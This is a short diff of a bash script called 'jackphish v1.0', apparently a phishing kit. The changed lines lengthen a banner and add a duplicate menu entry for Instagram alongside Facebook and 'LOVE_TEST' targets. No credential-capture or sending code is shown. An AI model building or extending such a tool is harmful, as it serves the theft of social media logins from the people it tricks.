@@ -2,7 +2,7 @@
 # jackphish v1.0
 #**********************************
 # contact : rovinimoni@gmail.com
-#*******************************
+#*********************************
 # @naitik_rauniyar
 trap 'printf "\e[4;35m \nHEY YOU  EXITED MY SCRIPT \e[0m\n";stop;exit 1' 2
 dependencies() {
@@ -13,7 +13,7 @@ command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not inst
 }
 
 menu() {
-
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Instagram\e[0m\n" 
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Instagram\e[0m\n"          
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m\n"    
 printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m LOVE_TEST\e[0m\n"          
